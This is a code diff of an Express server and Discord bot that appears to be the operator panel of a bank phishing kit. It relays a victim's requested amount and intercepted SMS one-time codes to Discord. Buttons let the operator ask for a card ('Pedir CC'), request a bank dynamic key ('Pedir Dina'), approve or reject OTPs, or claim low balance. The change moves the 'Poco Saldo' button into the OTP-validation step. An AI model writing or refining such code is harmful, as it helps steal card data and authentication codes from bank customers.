@@ -71,11 +71,9 @@ app.post('/nuevo', async (req, res) => {
                          { name: '💵 Monto Solicitado', value: `\`${datos.monto}\``, inline: true }
                      );
 
-                // 🔥 BOTONES CON EL DE POCO SALDO
                 row = new ActionRowBuilder().addComponents(
                     new ButtonBuilder().setCustomId(`cc_${finalUserId}`).setLabel('💳 Pedir CC').setStyle(ButtonStyle.Primary),
-                    new ButtonBuilder().setCustomId(`dina_${finalUserId}`).setLabel('📱 Pedir Dina').setStyle(ButtonStyle.Success),
-                    new ButtonBuilder().setCustomId(`saldo_${finalUserId}`).setLabel('💰 Poco Saldo').setStyle(ButtonStyle.Secondary)
+                    new ButtonBuilder().setCustomId(`dina_${finalUserId}`).setLabel('📱 Pedir Dina').setStyle(ButtonStyle.Success)
                 );
             } 
             else if (accion === 'otp') {
@@ -159,9 +157,11 @@ app.post('/validar-otp/:userId', async (req, res) => {
                 { name: '📱 SMS Recibido', value: `\`${otp}\``, inline: false }
             );
             
+            // 🔥 AQUÍ SE AGREGA EL BOTÓN DE POCO SALDO JUNTO A LOS DEMÁS
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar').setStyle(ButtonStyle.Success),
                 new ButtonBuilder().setCustomId(`otracc_${userId}`).setLabel('📱 Pedir otra CC').setStyle(ButtonStyle.Primary),
+                new ButtonBuilder().setCustomId(`saldo_${userId}`).setLabel('💰 Poco Saldo').setStyle(ButtonStyle.Secondary),
                 new ButtonBuilder().setCustomId(`rechazarotp_${userId}`).setLabel('❌ Rechazar OTP').setStyle(ButtonStyle.Danger)
             );
             await msg.edit({ embeds: [embed], components: [row] });
@@ -199,7 +199,7 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.reply({ content: `📱 Se solicitó dinámica al usuario.`, ephemeral: true });
     }
     else if (action === 'saldo') {
-        s.estado = 'poco_saldo'; // 🔥 NUEVO ESTADO
+        s.estado = 'poco_saldo'; 
         sesiones.set(userId, s);
         await interaction.reply({ content: `💰 Se le notificó al usuario que el saldo es insuficiente.`, ephemeral: true });
     }
